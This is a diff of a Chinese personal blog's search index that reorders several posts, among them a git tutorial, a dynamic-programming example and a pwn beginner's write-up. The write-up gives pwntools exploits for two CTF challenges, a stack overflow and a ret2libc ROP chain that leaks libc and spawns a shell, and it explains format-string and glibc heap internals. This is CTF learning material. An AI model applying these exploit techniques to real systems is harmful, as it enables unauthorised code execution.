@@ -40,6 +40,63 @@
       </tags>
   </entry>
   <entry>
+    <title>git的基本用法</title>
+    <url>/2022/09/13/git%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/</url>
+    <content><![CDATA[<p>git命令行的基本用法：</p>
+<span id="more"></span>
+<h3 id="Git-commit">Git commit</h3>
+<p>提交内容，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cl.jpg" alt=""></p>
+<p>输入指令:<strong>git commit</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cm.jpg" alt=""></p>
+<h3 id="Git-branch">Git branch</h3>
+<p>形成一个新的分支，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cn.jpg" alt=""></p>
+<p>输入指令：<strong>git branch newImage</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5co.jpg" alt=""></p>
+<p>输入指令：<strong>git checkout newImage + git commit</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cp.jpg" alt=""></p>
+<h3 id="Git-merge">Git merge</h3>
+<p>合并分支，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cq.jpg" alt=""></p>
+<p>输入指令<strong>git merge bugFix</strong>,此时会把bugFix包起来，注意当前指针指向Main</p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cr.jpg" alt=""></p>
+<p>此时调整指针到bugFix，再合并到main分支即可，命令行：<strong>git checkout bugFix + git merge main</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cs.jpg" alt=""></p>
+<h3 id="Git-rebase">Git rebase</h3>
+<p>由并行状态合并为线性状态，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5ct.jpg" alt=""></p>
+<p>输入指令：<strong>git rebase main</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cw.jpg" alt=""></p>
+<p>输入指令：<strong>git checkout main</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cu.jpg" alt=""></p>
+<p><strong>git rebase bugFix</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/13/a5cv.jpg" alt=""></p>
+<h3 id="Git-branch-f-XXX-HEAD-n">Git branch -f XXX HEAD~n</h3>
+<p>修改main分支到前几次的提交状态，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cP.jpg" alt=""></p>
+<p>指令<strong>git branch -f main HEAD~3</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cQ.jpg" alt=""></p>
+<h3 id="Git-cherry-pick">Git cherry-pick</h3>
+<p>将后交的状态复制到main分支中，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cR.jpg" alt=""></p>
+<p>指令<strong>git cherry-pick c2 c4</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cS.jpg" alt=""></p>
+<h3 id="Git-rebase-2">Git rebase</h3>
+<p>将已有的提交记录复制一份，可以自行选择顺序，分支，初始状态：</p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cT.jpg" alt=""></p>
+<p>指令<strong>git rebase -i HEAD~4</strong></p>
+<p><img src="https://i.niupic.com/images/2022/09/14/a5cU.jpg" alt=""></p>
+]]></content>
+      <categories>
+        <category>乱七八糟玩意</category>
+      </categories>
+      <tags>
+        <tag>git</tag>
+        <tag>瞎折腾</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>RSA学习</title>
     <url>/2022/11/01/RSA%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h3 id="RSA学习">RSA学习</h3>
@@ -121,60 +178,83 @@
       </tags>
   </entry>
   <entry>
-    <title>git的基本用法</title>
-    <url>/2022/09/13/git%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/</url>
-    <content><![CDATA[<p>git命令行的基本用法：</p>
+    <title>pwn:从一窍不通到入门的门前</title>
+    <url>/2022/07/06/pwn-%E4%BB%8E%E4%B8%80%E7%AA%8D%E4%B8%8D%E9%80%9A%E5%88%B0%E5%85%A5%E9%97%A8%E7%9A%84%E9%97%A8%E5%89%8D/</url>
+    <content><![CDATA[<p>基础pwn例题，栈溢出，格式化字符串。</p>
 <span id="more"></span>
-<h3 id="Git-commit">Git commit</h3>
-<p>提交内容，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cl.jpg" alt=""></p>
-<p>输入指令:<strong>git commit</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cm.jpg" alt=""></p>
-<h3 id="Git-branch">Git branch</h3>
-<p>形成一个新的分支，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cn.jpg" alt=""></p>
-<p>输入指令：<strong>git branch newImage</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5co.jpg" alt=""></p>
-<p>输入指令：<strong>git checkout newImage + git commit</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cp.jpg" alt=""></p>
-<h3 id="Git-merge">Git merge</h3>
-<p>合并分支，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cq.jpg" alt=""></p>
-<p>输入指令<strong>git merge bugFix</strong>,此时会把bugFix包起来，注意当前指针指向Main</p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cr.jpg" alt=""></p>
-<p>此时调整指针到bugFix，再合并到main分支即可，命令行：<strong>git checkout bugFix + git merge main</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cs.jpg" alt=""></p>
-<h3 id="Git-rebase">Git rebase</h3>
-<p>由并行状态合并为线性状态，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5ct.jpg" alt=""></p>
-<p>输入指令：<strong>git rebase main</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cw.jpg" alt=""></p>
-<p>输入指令：<strong>git checkout main</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cu.jpg" alt=""></p>
-<p><strong>git rebase bugFix</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/13/a5cv.jpg" alt=""></p>
-<h3 id="Git-branch-f-XXX-HEAD-n">Git branch -f XXX HEAD~n</h3>
-<p>修改main分支到前几次的提交状态，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cP.jpg" alt=""></p>
-<p>指令<strong>git branch -f main HEAD~3</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cQ.jpg" alt=""></p>
-<h3 id="Git-cherry-pick">Git cherry-pick</h3>
-<p>将后交的状态复制到main分支中，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cR.jpg" alt=""></p>
-<p>指令<strong>git cherry-pick c2 c4</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cS.jpg" alt=""></p>
-<h3 id="Git-rebase-2">Git rebase</h3>
-<p>将已有的提交记录复制一份，可以自行选择顺序，分支，初始状态：</p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cT.jpg" alt=""></p>
-<p>指令<strong>git rebase -i HEAD~4</strong></p>
-<p><img src="https://i.niupic.com/images/2022/09/14/a5cU.jpg" alt=""></p>
+<h3 id="栈溢出例题">栈溢出例题</h3>
+<h4 id="hello-pwn">hello_pwn</h4>
+<p>来源：攻防世界</p>
+<p>首先先checksec：</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/6b2f7f0eaed1bfad.png" alt=""></p>
+<p>再看伪代码：</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/29fb51325ccdec9c.png" alt=""></p>
+<p>再看偏移量：</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/904b3c8adc42b597.png" alt=""></p>
+<p>这里基本就明白了：当dowrd_60106C=1853186401时，执行下面的sub函数，sub函数就直接得出flag了，因此只要再前一步的read函数那里创造栈溢出，再人为满足条件判断即可。</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./hello_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52016)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="level3">level3</h4>
+<p>来源：攻防世界</p>
+<p>checksec:</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/70c82b33e6850c2c.png" alt=""></p>
+<p>32位程序，开启堆栈不可执行，这是一道构造ROP的经典例题。</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/5585dad554d0ea0d.png" alt=""></p>
+<p>源码看出漏洞还是栈溢出，但是此时找不到现成的system函数和binsh字符串。</p>
+<p>因此要找到system函数，知识点(搬运自wiki)</p>
+<ul>
+<li>system 函数属于 libc，而 <a href="http://libc.so">libc.so</a> 动态链接库中的函数之间相对偏移是固定的。</li>
+<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
+<li>查找Libc的网址：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>和<a href="https://libc.rip/">https://libc.rip/</a></li>
+</ul>
+<p>简单来说：实际的(真实的)地址是需要计算出来的，具体计算方式是：<strong>实际地址=libc偏移量+libc基地址</strong>在已知libc的情况下，我们需要做的就是找到<strong>libc的基址</strong>，而想要找到基址，我们需要知道一个函数的实际地址，本题中关键函数内存在write,read函数，因此想法是使用write函数泄露出write函数的真实地址，而plt表，got表，实际加载地址可以参考下图(搬运自csdn(滑稽))：</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/a7aa7555e20ab191.png" alt=""></p>
+<p>这样就可以得到基本的思路了: 先构造栈溢出使程序跳到write函数的plt表地址上，此时再次调用main函数或者vulnerable函数再次执行，此时就可以利用write函数打印出write的got表地址，此时需要我们人为的输入write函数的参数。这样就可以得到write函数的真实地址了。栈上的流程大概是这样的（仍然是搬运的(滑天下之大稽）：</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/13091ab9ec6a827c.png" alt=""></p>
+<p>这样输出之后我们就得到了write函数的真实地址了，再通过libc来求得system和binsh的真实地址，最后第二次调动程序，再次利用漏洞，就可以得到shell。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">59245</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc_write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base=write_got_addr-libc_write</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the system address is:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_bin=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;bin/sh&quot;</span>))//找到binsh偏移的方法</span><br><span class="line">bin_addr=libc_base+libc_bin</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the binsh address is:&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="格式化字符串">格式化字符串</h3>
+<p>基本原理以及利用方法在wiki上有解释。</p>
+<p>&lt;<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">原理介绍 - CTF Wiki (ctf-wiki.org)</a>&gt;</p>
+<p>主要意思是利用printf一类函数漏洞，当函数没有严格规定格式化字符串时，攻击者可以控制printf函数来输出其他内容，由于格式化字符串输出的是栈上内容，因此此漏洞可以找到栈上其他位置的信息，比如地址，数据。总结一下就是：超出的每一个格式化字符串都能对下一格栈空间造成影响。</p>
+<p>%d:打印成数字，只能泄露栈本身内容</p>
+<p>%x:打印成16进制，只能泄露栈本身内容</p>
+<p>%s:识别栈上内容为指针，打印出该指针指向的位置，这里有可能造成任意地址的泄露（只要能控制栈并完成布局）</p>
+<p>%c:输出字符</p>
+<p>%n:把前面已经打印的长度<strong>写入</strong>某个内存地址(实现任意地址写入)</p>
+<p>%n:写入4个字节，写入1–&gt;0000 0001</p>
+<p>%hn:写入两个字节，写入1–&gt;0001</p>
+<p>%hhn:写入单个字节,写入1–&gt;01</p>
+<h3 id="整数溢出">整数溢出</h3>
+<p>啥都没有，因为懒得搞，搞堆去了</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51S.jpg" alt=""></p>
+<h3 id="堆学习">堆学习</h3>
+<p>这里主要是学习了ptmalloc2 – glibc的堆实现和堆利用。</p>
+<h4 id="堆的相关数据结构">堆的相关数据结构</h4>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_chunk</span> &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd;         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd_nextsize; <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>可以看出在一个chunk中有这样几个数据</p>
+<ul>
+<li>prev_size: 如果该 chunk 的**物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）**是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。也就是说，上一个chunk空闲，表示大小，调用，则表示值。</li>
+<li>size：该chunk的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 也就是说64位size是16的整数倍，32位size是8的整数倍，这里就说明无论是32还是64位，size的低三位都一定是0，这样的话在chunk中这三位可以表示其他信息，分别从高到低表示为A，M，P。A表示该chunk是否属于主线程，1表示不属于，0表示属于；M表示记录当前chunk是否由mmap分配；P表示记录<strong>前一个 chunk</strong> 块是否被分配。一般来说，堆中<strong>第一个被分配的内存块的 size 字段的 P 位都会被设置为 1</strong>，以便于防止访问前面的非法内存。**当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。***这也方便进行空闲 chunk 之间的合并。</li>
+<li>fd和bk：fd表示指向下一个空闲的chunk，bk表示指向上一个空闲的chunk，这里要注意的是上下表示的是空闲的顺序而不是地址上的相邻。通过这里两个指针可以让空闲的chunk块加入到chunk块列表统一管理</li>
+<li>fd_nextsize,bk_nextsize：只用chunk空闲才使用，但用于较大的chunk，fd_nextsize指向前一个与当前chunk大小不同的第一个空闲块，不含bin指针；bk_nextsize指向后一个与当前chunk大小不同的第一个空闲块，不含bin指针。</li>
+</ul>
+<p>前两个字段称为chunk header,后面的部分称为user data。每次malloc申请得到的内存指针，是指向user data的起始处。</p>
+<p>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。<strong>这就是 chunk 中的空间复用。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
+<p>被释放的chunk被记录在链表中，具体结构如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&#x27; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`foot:&#x27; |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
+<h4 id="bin是什么">bin是什么</h4>
+<p>首先，用户释放的chunk不会马上归还给系统，ptmalloc会统一管理heap和mmap映射区域中空闲的chunk，用户再次请求分配内存时，ptmalloc会试图在空闲的chunk中挑选一块合适的给用户，可避免频繁地系统调用。ptmalloc会将空闲chunk的大小以及使用状态将chunk分为4类，fast bins, small bins, large bins, unsorted bin。相似大小的chunk会用双向链表链接起来，也就是说每类bin的内部会有多个互不相关的链表来保存不同大小的chunk。</p>
 ]]></content>
       <categories>
-        <category>乱七八糟玩意</category>
+        <category>希踢爱抚!</category>
       </categories>
       <tags>
-        <tag>git</tag>
-        <tag>瞎折腾</tag>
+        <tag>基础</tag>
+        <tag>入门</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -474,6 +554,31 @@
       </tags>
   </entry>
   <entry>
+    <title>基础算法02</title>
+    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9502/</url>
+    <content><![CDATA[<p>dp(动态规划)的基本例题，可以浅浅的帮助理解。</p>
+<span id="more"></span>
+<h4 id="例题一">例题一</h4>
+<p>先来看一道很简单的例题：</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/13a8cadd91043149.png" alt=""></p>
+<p>具体要求如下：</p>
+<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/fc137aba01164ed2.png" alt=""></p>
+<p>根据格式可以推出状态方程，这个方程不难，主要关注dp思想，找到状态方程，此题不难发现每一个数字只能往下或者往右走，因此每一个位置的最大值就等于其上面或上左位置的最大值，找到每一个数的最大值，这基本就是动态规划的思想。</p>
+<p>核心代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>ac代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"><span class="type">int</span> dp[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> number[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cin&gt;&gt;number[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">dpcount</span>();</span><br><span class="line">	cout&lt;&lt;ans;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+        <tag>算法</tag>
+        <tag>C++</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>位运算</title>
     <url>/2022/09/21/%E4%BD%8D%E8%BF%90%E7%AE%97/</url>
     <content><![CDATA[<p>位运算基础概念以及题目：</p>
@@ -554,137 +659,8 @@
       </categories>
       <tags>
         <tag>基础</tag>
-        <tag>C++</tag>
         <tag>算法</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pwn:从一窍不通到入门的门前</title>
-    <url>/2022/07/06/pwn-%E4%BB%8E%E4%B8%80%E7%AA%8D%E4%B8%8D%E9%80%9A%E5%88%B0%E5%85%A5%E9%97%A8%E7%9A%84%E9%97%A8%E5%89%8D/</url>
-    <content><![CDATA[<p>基础pwn例题，栈溢出，格式化字符串。</p>
-<span id="more"></span>
-<h3 id="栈溢出例题">栈溢出例题</h3>
-<h4 id="hello-pwn">hello_pwn</h4>
-<p>来源：攻防世界</p>
-<p>首先先checksec：</p>
-<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/6b2f7f0eaed1bfad.png" alt=""></p>
-<p>再看伪代码：</p>
-<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/29fb51325ccdec9c.png" alt=""></p>
-<p>再看偏移量：</p>
-<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/904b3c8adc42b597.png" alt=""></p>
-<p>这里基本就明白了：当dowrd_60106C=1853186401时，执行下面的sub函数，sub函数就直接得出flag了，因此只要再前一步的read函数那里创造栈溢出，再人为满足条件判断即可。</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./hello_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52016)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h4 id="level3">level3</h4>
-<p>来源：攻防世界</p>
-<p>checksec:</p>
-<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/70c82b33e6850c2c.png" alt=""></p>
-<p>32位程序，开启堆栈不可执行，这是一道构造ROP的经典例题。</p>
-<p><img src="https://s3.bmp.ovh/imgs/2023/01/06/5585dad554d0ea0d.png" alt=""></p>
-<p>源码看出漏洞还是栈溢出，但是此时找不到现成的system函数和binsh字符串。</p>
-<p>因此要找到system函数，知识点(搬运自wiki)</p>
-<ul>
-<li>system 函数属于 libc，而 <a href="http://libc.so">libc.so</a> 动态链接库中的函数之间相对偏移是固定的。</li>
-<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
-<li>查找Libc的网址：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>和<a href="https://libc.rip/">https://libc.rip/</a></li>
